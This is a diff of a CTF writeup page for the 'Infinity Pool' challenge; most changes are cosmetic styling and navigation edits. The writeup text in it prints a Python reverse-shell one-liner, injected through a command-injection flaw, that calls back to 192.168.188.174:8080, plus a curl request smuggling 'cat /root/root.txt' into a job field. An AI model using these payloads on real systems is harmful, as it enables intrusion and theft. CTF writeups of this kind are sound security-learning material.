@@ -3,16 +3,18 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>infinity_pool · hackerholidays</title>
-<meta name="description" content="CTF writeup: infinity_pool (hackerholidays)" />
+<title>Infinity Pool · hackerholidays</title>
+<meta name="description" content="CTF writeup: Infinity Pool (hackerholidays)" />
+<meta name="theme-color" content="#0E1117" />
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' fill='%230E1117'/%3E%3Crect x='13' y='4' width='6' height='24' fill='%23F0A34C'/%3E%3Crect x='4' y='13' width='24' height='6' fill='%23F0A34C'/%3E%3Crect x='14' y='6' width='4' height='20' fill='%230E1117'/%3E%3Crect x='6' y='14' width='20' height='4' fill='%230E1117'/%3E%3C/svg%3E" />
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Serif:wght@400;600;700&family=IBM+Plex+Sans:wght@400;500;600&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="../../css/style.css" />
 <link rel="stylesheet" href="../../css/pygments.css" />
 </head>
 <body>
-<div class="blueprint-grid" aria-hidden="true"></div>
+<div class="lab-grid" aria-hidden="true"></div>
 
 <header class="topbar">
   <div class="topbar__inner">
@@ -22,6 +24,7 @@
     </a>
     <div class="topbar__spacer"></div>
     <div class="topbar__actions">
+      <a class="btn btn--ghost btn--small" href="../../index.html">&#8592; All writeups</a>
       <a class="btn btn--ghost btn--small" href="https://aaadarsh1337.github.io/">&#8592; Portfolio</a>
       <a class="btn btn--ghost btn--small" href="https://github.com/aaadarsh1337/ctf-writeups" target="_blank" rel="noopener">Repo &#8599;</a>
     </div>
@@ -32,12 +35,9 @@
 
 <div class="reader-layout reader-layout--static">
   <aside class="sidebar">
-    <div class="sidebar__head">
-      <a class="btn btn--ghost btn--small" href="../../index.html">&#8592; All writeups</a>
-    </div>
     <div class="sidebar__challenge">
       <p class="tb-label">CHALLENGE</p>
-      <h2>infinity_pool</h2>
+      <h2>Infinity Pool</h2>
       <p class="side-path">hackerholidays</p>
     </div>
     <div class="sidebar__files">
@@ -78,7 +78,7 @@ Disallow: /status
 // TODO(ops): the staff connectivity tool at /status posts to the legacy
 // /internal/netcheck handler. Keep it out of the public nav until the new
 // auth gateway ships. Disallowed in robots.txt for now.
-console.log("Stay Noticed™");
+console.log(&quot;Stay Noticed™&quot;);
 </code></pre></div>
 
 <p>The <code>/internal/netcheck</code> endpoint was vulnerable to command injection. Testing it with:</p>
@@ -91,7 +91,7 @@ ping: usage error: Destination address required
 </code></pre></div>
 
 <p>We then used a Python reverse shell:</p>
-<div class="highlight"><pre><span></span><code>; python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.188.174",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+<div class="highlight"><pre><span></span><code>; python3 -c &#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.188.174&quot;,8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/sh&quot;)&#39;
 </code></pre></div>
 
 <p>This gave us a shell and allowed us to retrieve the user flag:</p>
@@ -122,7 +122,7 @@ ping: usage error: Destination address required
 </code></pre></div>
 
 <p>The automation service was running on port <code>9000</code>. We used the key to submit a job with command injection:</p>
-<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-sS<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://localhost:9000/jobs/export<span class="w"> </span>-H<span class="w"> </span><span class="s1">'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a'</span><span class="w"> </span>-H<span class="w"> </span><span class="s1">'Content-Type: application/json'</span><span class="w"> </span>--data-binary<span class="w"> </span><span class="s1">'{"report":"test;cat /root/root.txt;#"}'</span>
+<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-sS<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://localhost:9000/jobs/export<span class="w"> </span>-H<span class="w"> </span><span class="s1">&#39;Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a&#39;</span><span class="w"> </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="w"> </span>--data-binary<span class="w"> </span><span class="s1">&#39;{&quot;report&quot;:&quot;test;cat /root/root.txt;#&quot;}&#39;</span>
 </code></pre></div>
 
 <p>This retrieved the root flag:</p>
@@ -131,6 +131,7 @@ ping: usage error: Destination address required
 </blockquote>
 <p>Happy Hacking!</p>
       </div>
+<nav class="writeup-pager" aria-label="Writeup navigation"><a class="pager-item pager-item--previous" href="../../hackerholidays/do_not_disturb/index.html"><span class="pager-label">Previous</span><span class="pager-name">Do Not Disturb</span><span class="pager-event">hackerholidays</span></a><a class="pager-item pager-item--next" href="../../hackerholidays/management_wants_a_word/index.html"><span class="pager-label">Next</span><span class="pager-name">Management Wants A Word</span><span class="pager-event">hackerholidays</span></a></nav>
     </div>
   </article>
 </div>
